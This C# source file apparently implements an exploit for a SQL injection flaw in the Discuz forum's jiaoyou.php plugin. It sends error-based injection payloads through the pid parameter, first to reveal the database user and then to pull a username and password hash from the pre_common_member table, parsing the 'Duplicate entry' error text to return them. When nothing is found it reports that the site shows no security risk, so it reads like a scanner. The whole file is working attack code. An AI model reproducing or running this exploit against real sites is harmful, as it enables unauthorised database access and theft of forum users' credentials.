using System;
using System.Net;
using System.Text;
namespace windowsmanger
{
	internal class discuz
	{
		public string exp(string url)
		{
			string urls = url;
			if (!urls.Contains("http://"))
			{
				urls = "http://" + urls;
			}
			string ss = this.jiaoyouexp(urls);
			if (ss != "")
			{
				return ss;
			}
			return "网站未发现安全隐患";
		}
		public string jiaoyouexp(string url)
		{
			string userexp = "/jiaoyou.php?pid=1' or @`'` and(select 1 from(select count(*),concat((select (select concat(0x7e,0x27,unhex(hex(user())),0x27,0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or @`'` and '1'='1";
			string passwordexp = "/jiaoyou.php?pid=1' or @`'` and(select 1 from(select count(*),concat((select (select (SELECT concat(0x7e,0x27,cast(concat(username,0x24,password) as char),0x27,0x7e) FROM pre_common_member LIMIT 0,1) ) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) or @`'` and '1'='1 ";
			WebClient cli = new WebClient();
			cli.Encoding = Encoding.Default;
			string shujuisOk = cli.DownloadString(url + userexp);
			string jieguo = "";
			if (shujuisOk.Contains("Database Error"))
			{
				string shuju = cli.DownloadString(url + passwordexp);
				int kaishi = shuju.IndexOf("Duplicate entry '~'");
				string shujus = shuju.Substring(kaishi + 19, 100);
				jieguo = shujus.Substring(0, shujus.IndexOf("'"));
			}
			return jieguo;
		}
	}
}
